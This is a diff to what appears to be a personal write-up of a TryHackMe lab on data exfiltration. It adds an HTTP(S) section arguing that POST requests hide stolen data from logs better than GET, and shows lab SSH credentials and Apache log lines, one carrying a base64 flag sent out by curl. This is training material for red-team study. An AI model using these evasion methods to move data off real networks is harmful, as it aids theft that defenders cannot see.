@@ -3,7 +3,7 @@ title: Data Exfiltration
 date: 2023-10-20
 categories: [THM, Red Teaming]
 tags: [data-exfiltration, red-teaming]
-img_path: /assets/red-teaming/
+img_path: /assets/red-teaming/data-exfiltration
 mermaid: true
 ---
 > This is content from THM's [Data Exfiltration](https://tryhackme.com/room/dataxexfilt) room, part of the **Red Teaming** learning path.
@@ -162,3 +162,19 @@ The above command creates a tarball and sends it over SSH to the Jumpbox SSH ser
 
 # HTTP(S) Exfiltration
 
+Data Exfiltration through HTTP(S) is one of the best methods, as it hard to distinguish between legitimate and malicious HTTP traffic. We will be using the **POST HTTP request**, as with a **GET HTTP request**, all parameters are registered into the log file. POST HTTP requests:
+- Are never cached.
+- Do not remain in the browser history.
+- Cannot be bookmarked.
+- Have no restrictions on data length.
+
+Let's login into `web.thm.com` and inspect the Apache log file with 2 HTTP Requests:
+
+```shell
+ssh thm@web.thm.com
+# password: tryhackme
+
+sudo cat /var/log/apache2/access.log
+# 192.168.0.133 - - [29/Apr/2022:11:41:54 +0100] "GET /example.php?flag=VEhNe0g3N1AtRzM3LTE1LWYwdW42fQo= HTTP/1.1" 200 495 "-" "curl/7.68.0"
+# 192.168.0.133 - - [29/Apr/2022:11:42:14 +0100] "POST /example.php HTTP/1.1" 200 395 "-" "curl/7.68.0"
+```
